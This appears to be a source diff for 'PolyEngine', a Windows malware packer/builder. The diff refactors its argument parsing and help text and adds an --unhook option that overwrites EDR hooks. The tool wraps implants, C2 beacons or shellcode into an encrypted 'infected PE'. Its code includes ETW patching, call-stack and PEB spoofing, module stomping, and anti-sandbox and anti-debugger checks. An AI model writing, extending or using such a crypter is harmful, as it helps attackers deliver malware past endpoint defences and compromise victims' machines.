@@ -55,33 +55,66 @@ static const char* kSpoofPool[] = {
 
 /* ── --disable token lookup table ──────────────────────────────────────────
  *
- *  Maps each --disable identifier to the opsecFlags bitmask bit it sets.
- *  "all" is handled separately: it ORs every entry in this table plus
- *  EVASION_FLAG_NO_ALL (fast-exit shortcut in Evasion_RunChecks).
+ *  Single source of truth: every --disable token, the opsecFlags bit it sets,
+ *  the help group it belongs to, and the help-text shown in --help all live
+ *  in this one table.  Adding a new token = one line here.  The parser, the
+ *  unknown-token error message, and the usage printer all iterate this array.
+ *
+ *  "all" is handled separately: it ORs every entry plus EVASION_FLAG_NO_ALL
+ *  (fast-exit shortcut in Evasion_RunChecks).
  *
  *  Tokens are matched case-insensitively.  Multiple tokens may appear in one
  *  --disable argument separated by commas (e.g. --disable etw,peb,cpu),
  *  and --disable may be repeated on the command line.
  * ------------------------------------------------------------------------- */
-typedef struct { const char* name; DWORD flag; } DISABLE_ENTRY;
+typedef enum {
+    DGROUP_OPSEC,
+    DGROUP_SANDBOX,
+} DISABLE_GROUP;
+
+typedef struct {
+    const char*   name;
+    DWORD         flag;
+    DISABLE_GROUP group;
+    const char*   help;
+} DISABLE_ENTRY;
+
 static const DISABLE_ENTRY kDisableMap[] = {
     /* OPSEC technique disable */
-    { "etw",       OPSEC_FLAG_NO_ETW          },  /* skip EtwEventWrite patch     */
-    { "spoofing",  OPSEC_FLAG_NO_CALLSTACK    },  /* skip VEH/HWBP call-stack spoof */
-    { "peb",       OPSEC_FLAG_NO_PEB          },  /* skip PEB path/cmdline spoof  */
-    { "tls",       OPSEC_FLAG_NO_TLS          },  /* skip TLS anti-debug callback */
+    { "etw",       OPSEC_FLAG_NO_ETW,           DGROUP_OPSEC,   "EtwEventWrite patch (ETW telemetry)" },
+    { "spoofing",  OPSEC_FLAG_NO_CALLSTACK,     DGROUP_OPSEC,   "Call-stack spoofing (SilentMoonwalk RSP pivot)" },
+    { "peb",       OPSEC_FLAG_NO_PEB,           DGROUP_OPSEC,   "PEB path/cmdline spoof" },
+    { "tls",       OPSEC_FLAG_NO_TLS,           DGROUP_OPSEC,   "TLS anti-debug callback" },
     /* Evasion check disable */
-    { "hammer",    EVASION_FLAG_NO_HAMMER      },  /* skip VirtualAlloc/Free delay */
-    { "debugger",  EVASION_FLAG_NO_DEBUGGER    },  /* skip PEB / NtQIP debug check */
-    { "api-emu",   EVASION_FLAG_NO_API_EMU     },  /* skip RtlComputeCrc32 probe   */
-    { "exec-ctrl", EVASION_FLAG_NO_EXEC_CTRL   },  /* skip "wuauctl" semaphore to run more than 1 session at once */
-    { "sleep-fwd", EVASION_FLAG_NO_SLEEP_FWD   },  /* skip sleep-forwarding timing */
-    { "uptime",    EVASION_FLAG_NO_UPTIME       },  /* skip < 2 min uptime check */
-    { "cpu",       EVASION_FLAG_NO_CPU_COUNT    },  /* skip < 2 CPU check if its troublesome */
-    { "screen",    EVASION_FLAG_NO_SCREEN_RES   },  /* skip screen resolution check */
-    { "files",     EVASION_FLAG_NO_RECENT_FILES },  /* skip recent-files key check  */
-    { NULL, 0 }
+    { "hammer",    EVASION_FLAG_NO_HAMMER,      DGROUP_SANDBOX, "API-hammer timing delay (VirtualAlloc/Free loop)" },
+    { "debugger",  EVASION_FLAG_NO_DEBUGGER,    DGROUP_SANDBOX, "Debugger detection (PEB flags / NtQueryInformationProcess)" },
+    { "api-emu",   EVASION_FLAG_NO_API_EMU,     DGROUP_SANDBOX, "API emulation probe (RtlComputeCrc32 identity check)" },
+    { "exec-ctrl", EVASION_FLAG_NO_EXEC_CTRL,   DGROUP_SANDBOX, "Execution-control semaphore (re-execution detection)" },
+    { "sleep-fwd", EVASION_FLAG_NO_SLEEP_FWD,   DGROUP_SANDBOX, "Sleep-forwarding detection (timing)" },
+    { "uptime",    EVASION_FLAG_NO_UPTIME,      DGROUP_SANDBOX, "System uptime check" },
+    { "cpu",       EVASION_FLAG_NO_CPU_COUNT,   DGROUP_SANDBOX, "CPU count check (< 2 logical cores)" },
+    { "screen",    EVASION_FLAG_NO_SCREEN_RES,  DGROUP_SANDBOX, "Screen resolution check (<= 1024 px width)" },
+    { "files",     EVASION_FLAG_NO_RECENT_FILES,DGROUP_SANDBOX, "Recent-files count check (< 5 RecentDocs subkeys)" },
+    { NULL, 0, DGROUP_OPSEC, NULL }
 };
+
+/* Prints "    name        help" lines for every entry whose group matches.
+ * Used by PrintUsage to render OPSEC and Sandbox blocks from the same table. */
+static void PrintDisableGroup(DISABLE_GROUP group) {
+    for (int k = 0; kDisableMap[k].name; k++) {
+        if (kDisableMap[k].group == group) {
+            printf("    %-11s %s\n", kDisableMap[k].name, kDisableMap[k].help);
+        }
+    }
+}
+
+/* Prints the comma-separated list of valid token names (used in error message). */
+static void PrintDisableTokens(void) {
+    for (int k = 0; kDisableMap[k].name; k++) {
+        printf("%s%s", (k > 0 ? " " : ""), kDisableMap[k].name);
+    }
+    printf(" all");
+}
 
 /* Parses a comma-separated list of disable tokens and ORs the corresponding
  * flags into *pFlags.  "all" disables every entry plus EVASION_FLAG_NO_ALL.
@@ -108,10 +141,10 @@ static BOOL ApplyDisableList(const char* list, DWORD* pFlags) {
                 }
             }
             if (!found) {
-                printf("[!] Unknown --disable token: \"%s\"\n"
-                       "    Valid tokens: etw spoofing peb tls hammer debugger\n"
-                       "                  api-emu exec-ctrl sleep-fwd uptime cpu\n"
-                       "                  screen files all\n", tok);
+                printf("[!] Unknown --disable token: \"%s\"\n", tok);
+                printf("    Valid tokens: ");
+                PrintDisableTokens();
+                printf("\n");
                 return FALSE;
             }
         }
@@ -121,54 +154,63 @@ static BOOL ApplyDisableList(const char* list, DWORD* pFlags) {
 }
 
 /* -------------------------------------------------------------------------
+ *  BUILD_CONFIG — every CLI-parsed parameter that flows into BuildInfectedPE
+ *  Filled by ParseArgs.  Defaults set by BuildConfig_Defaults.
+ * ------------------------------------------------------------------------- */
+typedef struct {
+    const char* targetPath;       /* argv[1]  — input PE/shellcode               */
+    const char* outputPath;       /* argv[2]  — output exe                        */
+    const char* stubPath;         /* --stub   — default: "stub.bin"               */
+    BYTE        dll_indices[3];   /* --preset — default: PRINT (0, 1, 2)          */
+    char        exportName[64];   /* --export — raw name, hashed post-parse       */
+    char        exportArg[128];   /* --arg    — passed to export at runtime       */
+    char        spoofExe[64];     /* --spoof-name — empty = random from pool      */
+    char        semaphoreName[32];/* --exec-ctrl-name — empty = use default       */
+    DWORD       sleepFwdMs;       /* --sleep-fwd-ms   — 0 = use default 500 ms    */
+    DWORD       uptimeMin;        /* --uptime-min     — 0 = use default 2 min     */
+    DWORD       hammerMs;         /* --hammer-s       — 0 = use default 3000 ms   */
+    DWORD       opsecFlags;       /* --disable / --overload / --keep-alive / --unhook */
+} BUILD_CONFIG;
+
+static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
+    cfg->targetPath       = NULL;
+    cfg->outputPath       = NULL;
+    cfg->stubPath         = "stub.bin";
+    cfg->dll_indices[0]   = 0;  /* PRINT preset */
+    cfg->dll_indices[1]   = 1;
+    cfg->dll_indices[2]   = 2;
+    cfg->exportName[0]    = '\0';
+    cfg->exportArg[0]     = '\0';
+    cfg->spoofExe[0]      = '\0';
+    cfg->semaphoreName[0] = '\0';
+    cfg->sleepFwdMs       = 0;
+    cfg->uptimeMin        = 0;
+    cfg->hammerMs         = 0;
+    cfg->opsecFlags       = 0;
+}
+
+/* -------------------------------------------------------------------------
  *  ParseArgs — minimal CLI argument parser
  *  Returns FALSE on bad/missing arguments; caller prints usage.
  * ------------------------------------------------------------------------- */
-static BOOL ParseArgs(int argc, char* argv[],
-                      const char** ppTargetPath,
-                      const char** ppOutputPath,
-                      const char** ppStubPath,
-                      BYTE         dll_indices[3],
-                      char         exportNameBuf[64],
-                      char         exportArgBuf[128],
-                      char         spoofExeBuf[64],
-                      char         semaphoreNameBuf[32],
-                      DWORD*       pSleepFwdMs,
-                      DWORD*       pUptimeMin,
-                      DWORD*       pHammerMs,
-                      DWORD*       pOpsecFlags)
-{
+static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
     if (argc < 3) return FALSE;
 
-    *ppTargetPath   = argv[1];
-    *ppOutputPath   = argv[2];
-    *ppStubPath     = "stub.bin";
-    exportNameBuf[0] = '\0';
-    *pSleepFwdMs  = 0;   /* 0 = use default 500 ms  */
-    *pUptimeMin   = 0;   /* 0 = use default 2 min   */
-    *pHammerMs    = 0;   /* 0 = use default 3000 ms */
-    *pOpsecFlags  = 0;
-    exportArgBuf[0]     = '\0';
-    spoofExeBuf[0]      = '\0';  /* empty = will be filled with random pool entry after parsing */
-    semaphoreNameBuf[0] = '\0';  /* empty = use default "wuauctl" at runtime */
-
-    /* Default preset: PRINT (indices 0, 1, 2) */
-    dll_indices[0] = 0;
-    dll_indices[1] = 1;
-    dll_indices[2] = 2;
+    cfg->targetPath = argv[1];
+    cfg->outputPath = argv[2];
 
     for (int i = 3; i < argc; i++) {
         if (_stricmp(argv[i], "--stub") == 0 && i + 1 < argc) {
-            *ppStubPath = argv[++i];
+            cfg->stubPath = argv[++i];
         }
         else if (_stricmp(argv[i], "--preset") == 0 && i + 1 < argc) {
             const char* preset = argv[++i];
             if (_stricmp(preset, "PRINT") == 0) {
-                dll_indices[0] = 0; dll_indices[1] = 1; dll_indices[2] = 2;
+                cfg->dll_indices[0] = 0; cfg->dll_indices[1] = 1; cfg->dll_indices[2] = 2;
             } else if (_stricmp(preset, "MEDIA") == 0) {
-                dll_indices[0] = 3; dll_indices[1] = 4; dll_indices[2] = 5;
+                cfg->dll_indices[0] = 3; cfg->dll_indices[1] = 4; cfg->dll_indices[2] = 5;
             } else if (_stricmp(preset, "NETWORK") == 0) {
-                dll_indices[0] = 6; dll_indices[1] = 7; dll_indices[2] = 8;
+                cfg->dll_indices[0] = 6; cfg->dll_indices[1] = 7; cfg->dll_indices[2] = 8;
             } else if (_stricmp(preset, "RANDOM") == 0) {
                 /* CryptGenRandom fills a byte for each index, then mod 10 */
                 HCRYPTPROV hProv = 0;
@@ -177,9 +219,9 @@ static BOOL ParseArgs(int argc, char* argv[],
                     CryptGenRandom(hProv, 3, rnd);
                     CryptReleaseContext(hProv, 0);
                 }
-                dll_indices[0] = rnd[0] % 10;
-                dll_indices[1] = rnd[1] % 10;
-                dll_indices[2] = rnd[2] % 10;
+                cfg->dll_indices[0] = rnd[0] % 10;
+                cfg->dll_indices[1] = rnd[1] % 10;
+                cfg->dll_indices[2] = rnd[2] % 10;
             } else {
                 printf("[!] Unknown preset: %s  (valid: PRINT, MEDIA, NETWORK, RANDOM)\n", preset);
                 return FALSE;
@@ -187,44 +229,44 @@ static BOOL ParseArgs(int argc, char* argv[],
         }
         else if (_stricmp(argv[i], "--export") == 0 && i + 1 < argc) {
             /* Store raw name — hash computed after key_salt is known */
-            strncpy_s(exportNameBuf, 64, argv[++i], 63);
-            exportNameBuf[63] = '\0';
+            strncpy_s(cfg->exportName, sizeof(cfg->exportName), argv[++i], sizeof(cfg->exportName) - 1);
+            cfg->exportName[sizeof(cfg->exportName) - 1] = '\0';
         }
         else if (_stricmp(argv[i], "--arg") == 0 && i + 1 < argc) {
-            const char* arg = argv[++i];
-            strncpy_s(exportArgBuf, 128, arg, 127);
-            exportArgBuf[127] = '\0';
+            strncpy_s(cfg->exportArg, sizeof(cfg->exportArg), argv[++i], sizeof(cfg->exportArg) - 1);
+            cfg->exportArg[sizeof(cfg->exportArg) - 1] = '\0';
         }
         else if (_stricmp(argv[i], "--spoof-name") == 0 && i + 1 < argc) {
-            const char* name = argv[++i];
-            strncpy_s(spoofExeBuf, 64, name, 63);
-            spoofExeBuf[63] = '\0';
+            strncpy_s(cfg->spoofExe, sizeof(cfg->spoofExe), argv[++i], sizeof(cfg->spoofExe) - 1);
+            cfg->spoofExe[sizeof(cfg->spoofExe) - 1] = '\0';
         }
         else if (_stricmp(argv[i], "--exec-ctrl-name") == 0 && i + 1 < argc) {
-            const char* name = argv[++i];
-            strncpy_s(semaphoreNameBuf, 32, name, 31);
-            semaphoreNameBuf[31] = '\0';
+            strncpy_s(cfg->semaphoreName, sizeof(cfg->semaphoreName), argv[++i], sizeof(cfg->semaphoreName) - 1);
+            cfg->semaphoreName[sizeof(cfg->semaphoreName) - 1] = '\0';
         }
         else if (_stricmp(argv[i], "--sleep-fwd-ms") == 0 && i + 1 < argc) {
             int v = atoi(argv[++i]);
-            *pSleepFwdMs = (v > 0) ? (DWORD)v : 0;
+            cfg->sleepFwdMs = (v > 0) ? (DWORD)v : 0;
         }
         else if (_stricmp(argv[i], "--uptime-min") == 0 && i + 1 < argc) {
             int v = atoi(argv[++i]);
-            *pUptimeMin = (v > 0) ? (DWORD)v : 0;
+            cfg->uptimeMin = (v > 0) ? (DWORD)v : 0;
         }
         else if (_stricmp(argv[i], "--hammer-s") == 0 && i + 1 < argc) {
             int v = atoi(argv[++i]);
-            *pHammerMs = (v > 0) ? (DWORD)(v * 1000) : 0;
+            cfg->hammerMs = (v > 0) ? (DWORD)(v * 1000) : 0;
         }
         else if (_stricmp(argv[i], "--overload") == 0) {
-            *pOpsecFlags |= OPSEC_FLAG_MODULE_OVERLOAD;
+            cfg->opsecFlags |= OPSEC_FLAG_MODULE_OVERLOAD;
         }
         else if (_stricmp(argv[i], "--keep-alive") == 0) {
-            *pOpsecFlags |= OPSEC_FLAG_KEEP_ALIVE;
+            cfg->opsecFlags |= OPSEC_FLAG_KEEP_ALIVE;
+        }
+        else if (_stricmp(argv[i], "--unhook") == 0) {
+            cfg->opsecFlags |= EVASION_FLAG_UNHOOK;
         }
         else if (_stricmp(argv[i], "--disable") == 0 && i + 1 < argc) {
-            if (!ApplyDisableList(argv[++i], pOpsecFlags)) return FALSE;
+            if (!ApplyDisableList(argv[++i], &cfg->opsecFlags)) return FALSE;
         }
         else {
             printf("[!] Unknown option: %s\n", argv[i]);
@@ -234,6 +276,60 @@ static BOOL ParseArgs(int argc, char* argv[],
     return TRUE;
 }
 
+/* -------------------------------------------------------------------------
+ *  PrintUsage — single source for help text.  --disable tokens come straight
+ *  out of kDisableMap so this can never drift from the parser.
+ * ------------------------------------------------------------------------- */
+static void PrintUsage(void) {
+    printf("Usage: Builder.exe <input> <output> [OPTIONS]\n");
+    printf("\n");
+    printf("  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)\n");
+    printf("            Auto-detected from MZ header\n");
+    printf("  <output>  Output executable\n");
+    printf("\n");
+    printf("Loader:\n");
+    printf("  --stub <path>              Path to stub.bin  [default: ./stub.bin]\n");
+    printf("  --preset PRINT|MEDIA|NETWORK|RANDOM\n");
+    printf("                             Module stomping DLL preset  [default: PRINT]\n");
+    printf("  --overload                 Module overloading instead of stomping\n");
+    printf("                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)\n");
+    printf("  --keep-alive               ExitThread(0) instead of ExitProcess\n");
+    printf("                             (required for C2 implants that spawn their own threads)\n");
+    printf("  --unhook                   Restore original .text bytes in ntdll/kernel32/kernelbase\n");
+    printf("                             from \\KnownDlls\\ clean copies, overwriting EDR inline hooks\n");
+    printf("\n");
+    printf("Payload  (PE/DLL only, silently ignored for shellcode):\n");
+    printf("  --export <name>            DLL export to invoke after DllMain\n");
+    printf("  --arg <string>             Argument passed to the export  [max 127 chars]\n");
+    printf("\n");
+    printf("Evasion customization (all ON by default):\n");
+    printf("  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]\n");
+    printf("                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe\n");
+    printf("                                   SearchIndexer.exe taskhostw.exe spoolsv.exe\n");
+    printf("                                   wlrmdr.exe WMPDMC.exe hvix64.exe\n");
+    printf("  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]\n");
+    printf("                             (max 31 chars)\n");
+    printf("  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]\n");
+    printf("                             Detection threshold: 90%% of <ms> elapsed\n");
+    printf("  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]\n");
+    printf("  --hammer-s <seconds>       API-hammer delay duration  [default: 3]\n");
+    printf("  --disable <token[,token]>  Disable one or more features (comma-separated, repeatable)\n");
+    printf("\n");
+    printf("  OPSEC tokens:\n");
+    PrintDisableGroup(DGROUP_OPSEC);
+    printf("\n");
+    printf("  Sandbox/debug check tokens:\n");
+    PrintDisableGroup(DGROUP_SANDBOX);
+    printf("    %-11s %s\n", "all", "Disable every token listed above");
+    printf("\n");
+    printf("Examples:\n");
+    printf("  Builder.exe implant.exe     packed.exe\n");
+    printf("  Builder.exe shellcode.bin   packed.exe --keep-alive\n");
+    printf("  Builder.exe beacon.dll      packed.exe --export Start --keep-alive\n");
+    printf("  Builder.exe payload.dll     packed.exe --export Execute --arg \"calc.exe\"\n");
+    printf("  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls\n");
+}
+
 int main(int argc, char* argv[]) {
   printf("=============================================\n");
   printf("# PolyEngine - Polymorphic Mutation Engine # \n");
@@ -241,85 +337,17 @@ int main(int argc, char* argv[]) {
   printf("#                                  By Razz # \n");
   printf("=============================================\n\n");
 
-  const char* targetPath = NULL;
-  const char* stubPath   = NULL;
-  const char* outputPath = NULL;
-  BYTE        dll_indices[3]        = { 0 };
-  DWORD       exportHash            = 0;
-  char        exportNameBuf[64]     = { 0 };   /* raw --export name; hashed after key_salt */
-  char        exportArgBuf[128]     = { 0 };
-  char        spoofExeBuf[64]       = { 0 };
-  char        semaphoreNameBuf[32]  = { 0 };
-  DWORD       sleepFwdMs            = 0;
-  DWORD       uptimeMin             = 0;
-  DWORD       hammerMs              = 0;
-  DWORD       opsecFlags            = 0;
+  BUILD_CONFIG cfg;
+  BuildConfig_Defaults(&cfg);
+  DWORD exportHash = 0;   /* derived post-parse from cfg.exportName + key_salt[0] */
 
-  if (!ParseArgs(argc, argv, &targetPath, &outputPath, &stubPath, dll_indices,
-                 exportNameBuf, exportArgBuf, spoofExeBuf,
-                 semaphoreNameBuf, &sleepFwdMs, &uptimeMin, &hammerMs,
-                 &opsecFlags)) {
-      printf("Usage: Builder.exe <input> <output> [OPTIONS]\n");
-      printf("\n");
-      printf("  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)\n");
-      printf("            Auto-detected from MZ header\n");
-      printf("  <output>  Output executable\n");
-      printf("\n");
-      printf("Loader:\n");
-      printf("  --stub <path>              Path to stub.bin  [default: ./stub.bin]\n");
-      printf("  --preset PRINT|MEDIA|NETWORK|RANDOM\n");
-      printf("                             Module stomping DLL preset  [default: PRINT]\n");
-      printf("  --overload                 Module overloading instead of stomping\n");
-      printf("                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)\n");
-      printf("  --keep-alive               ExitThread(0) instead of ExitProcess\n");
-      printf("                             (required for C2 implants that spawn their own threads)\n");
-      printf("\n");
-      printf("Payload  (PE/DLL only, silently ignored for shellcode):\n");
-      printf("  --export <name>            DLL export to invoke after DllMain\n");
-      printf("  --arg <string>             Argument passed to the export  [max 127 chars]\n");
-      printf("\n");
-      printf("Evasion customization (all ON by default):\n");
-      printf("  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]\n");
-      printf("                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe\n");
-      printf("                                   SearchIndexer.exe taskhostw.exe spoolsv.exe\n");
-      printf("                                   wlrmdr.exe WMPDMC.exe hvix64.exe\n");
-      printf("  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]\n");
-      printf("                             (max 31 chars)\n");
-      printf("  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]\n");
-      printf("                             Detection threshold: 90%% of <ms> elapsed\n");
-      printf("  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]\n");
-      printf("  --hammer-s <seconds>       API-hammer delay duration  [default: 3]\n");
-      printf("  --disable <token[,token]>  Disable one or more features (comma-separated, repeatable)\n");
-      printf("\n");
-      printf("  OPSEC tokens:\n");
-      printf("    etw         EtwEventWrite patch (ETW telemetry)\n");
-      printf("    spoofing    Call-stack spoofing (VEH/HWBP)\n");
-      printf("    peb         PEB path/cmdline spoof\n");
-      printf("    tls         TLS anti-debug callback\n");
-      printf("\n");
-      printf("  Sandbox/debug check tokens:\n");
-      printf("    hammer      API-hammer timing delay (VirtualAlloc/Free loop)\n");
-      printf("    debugger    Debugger detection (PEB flags / NtQueryInformationProcess)\n");
-      printf("    api-emu     API emulation probe (RtlComputeCrc32 identity check)\n");
-      printf("    exec-ctrl   Execution-control semaphore (re-execution detection)\n");
-      printf("    sleep-fwd   Sleep-forwarding detection (timing)\n");
-      printf("    uptime      System uptime check\n");
-      printf("    cpu         CPU count check (< 2 logical cores)\n");
-      printf("    screen      Screen resolution check (<= 1024 px width)\n");
-      printf("    files       Recent-files count check (< 5 RecentDocs subkeys)\n");
-      printf("    all         Disable every token listed above\n");
-      printf("\n");
-      printf("Examples:\n");
-      printf("  Builder.exe implant.exe     packed.exe\n");
-      printf("  Builder.exe shellcode.bin   packed.exe --keep-alive\n");
-      printf("  Builder.exe beacon.dll      packed.exe --export Start --keep-alive\n");
-      printf("  Builder.exe payload.dll     packed.exe --export Execute --arg \"calc.exe\"\n");
-      printf("  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls\n");
+  if (!ParseArgs(argc, argv, &cfg)) {
+      PrintUsage();
       return 1;
   }
 
   /* If --spoof-name was not provided, pick a random entry from the pool. */
-  if (spoofExeBuf[0] == '\0') {
+  if (cfg.spoofExe[0] == '\0') {
       HCRYPTPROV hProv = 0;
       BYTE rndByte = 0;
       if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
@@ -327,10 +355,10 @@ int main(int argc, char* argv[]) {
           CryptReleaseContext(hProv, 0);
       }
       const char* picked = kSpoofPool[rndByte % SPOOF_POOL_SIZE];
-      strncpy_s(spoofExeBuf, 64, picked, 63);
-      printf("[*] PEB spoof process: %s (random)\n", spoofExeBuf);
+      strncpy_s(cfg.spoofExe, sizeof(cfg.spoofExe), picked, sizeof(cfg.spoofExe) - 1);
+      printf("[*] PEB spoof process: %s (random)\n", cfg.spoofExe);
   } else {
-      printf("[*] PEB spoof process: %s (user-specified)\n", spoofExeBuf);
+      printf("[*] PEB spoof process: %s (user-specified)\n", cfg.spoofExe);
   }
 
   /* STEP 1: Initialization API */
@@ -348,10 +376,10 @@ int main(int argc, char* argv[]) {
          cipherKey.key1, cipherKey.rotBits, cipherKey.key3, cipherKey.key4);
 
   /* STEP 3: Reading Target payload (PE or raw shellcode) */
-  printf("[*] Phase 3: Reading target payload: %s\n", targetPath);
+  printf("[*] Phase 3: Reading target payload: %s\n", cfg.targetPath);
   BYTE* rawTargetBuffer = NULL;
   DWORD rawTargetSize = 0;
-  if (!ReadFileToBuffer(targetPath, &rawTargetBuffer, &rawTargetSize)) {
+  if (!ReadFileToBuffer(cfg.targetPath, &rawTargetBuffer, &rawTargetSize)) {
       fprintf(stderr, "[!] ERROR: Failed to read target file.\n");
       return 1;
   }
@@ -362,11 +390,11 @@ int main(int argc, char* argv[]) {
    * is identical for both formats — only the Stub execution path differs. */
   if (rawTargetSize >= 2 &&
       !(rawTargetBuffer[0] == 'M' && rawTargetBuffer[1] == 'Z')) {
-      opsecFlags |= PAYLOAD_FLAG_IS_SHELLCODE;
+      cfg.opsecFlags |= PAYLOAD_FLAG_IS_SHELLCODE;
       printf("[*] Payload type: raw shellcode (no MZ header) - stub will execute directly\n");
       /* --export / --arg are meaningless for shellcode; clear silently */
-      exportHash      = 0;
-      exportArgBuf[0] = '\0';
+      exportHash       = 0;
+      cfg.exportArg[0] = '\0';
   } else {
       printf("[*] Payload type: PE (MZ detected) - stub will use RunPE\n");
   }
@@ -435,12 +463,12 @@ int main(int argc, char* argv[]) {
   /* Compute export hash NOW — uses key_salt[0] as the per-build seed.
    * This eliminates the fixed 0xDEADC0DE constant from both Builder and stub.bin.
    * Stub reads key_salt[0] from .rsrc (before zeroing) and passes it to RunPE(). */
-  if (exportNameBuf[0] != '\0' && !(opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE)) {
-      exportHash = BuilderDjb2A(exportNameBuf, key_salt[0]);
+  if (cfg.exportName[0] != '\0' && !(cfg.opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE)) {
+      exportHash = BuilderDjb2A(cfg.exportName, key_salt[0]);
       printf("[+] Export hash: 0x%08X  (seed=key_salt[0]=0x%08X, name=\"%s\")\n",
-             exportHash, key_salt[0], exportNameBuf);
+             exportHash, key_salt[0], cfg.exportName);
   }
-  SecureZeroMemory(exportNameBuf, sizeof(exportNameBuf));
+  SecureZeroMemory(cfg.exportName, sizeof(cfg.exportName));
 
   printf("[*] Phase 7b: XTEA outer encryption...\n");
   DWORD xteaKey[4];
@@ -486,7 +514,7 @@ int main(int argc, char* argv[]) {
 
       int anyFit = 0;
       for (int i = 0; i < 3; i++) {
-          BYTE idx = dll_indices[i];
+          BYTE idx = cfg.dll_indices[i];
           if (idx >= 10) continue;
 
           const char* dllName = kDllPool[idx];
@@ -541,20 +569,20 @@ int main(int argc, char* argv[]) {
   /* STEP 8: Building Final PE */
   printf("[*] Phase 8: Building Final PE...\n");
   printf("[*] Module-stomp preset: DLL pool indices [%u, %u, %u]\n",
-         dll_indices[0], dll_indices[1], dll_indices[2]);
-  if (BuildInfectedPE(stubPath, outputPath,
+         cfg.dll_indices[0], cfg.dll_indices[1], cfg.dll_indices[2]);
+  if (BuildInfectedPE(cfg.stubPath, cfg.outputPath,
                       mutated.pBuffer, mutated.totalSize,
                       rawTargetSize, (DWORD)mutated.stubSize,
-                      key_salt, dll_indices,
-                      exportHash, exportArgBuf,
-                      spoofExeBuf,
-                      semaphoreNameBuf[0] ? semaphoreNameBuf : NULL,
-                      sleepFwdMs,
-                      uptimeMin,
-                      hammerMs,
-                      opsecFlags)) {
+                      key_salt, cfg.dll_indices,
+                      exportHash, cfg.exportArg,
+                      cfg.spoofExe,
+                      cfg.semaphoreName[0] ? cfg.semaphoreName : NULL,
+                      cfg.sleepFwdMs,
+                      cfg.uptimeMin,
+                      cfg.hammerMs,
+                      cfg.opsecFlags)) {
       printf("\n[+] === You're good to go! Build finished. ===\n");
-      printf("[+] Saved as: %s\n", outputPath);
+      printf("[+] Saved as: %s\n", cfg.outputPath);
   } else {
       fprintf(stderr, "\n[!] === Build failed. ===\n");
   }
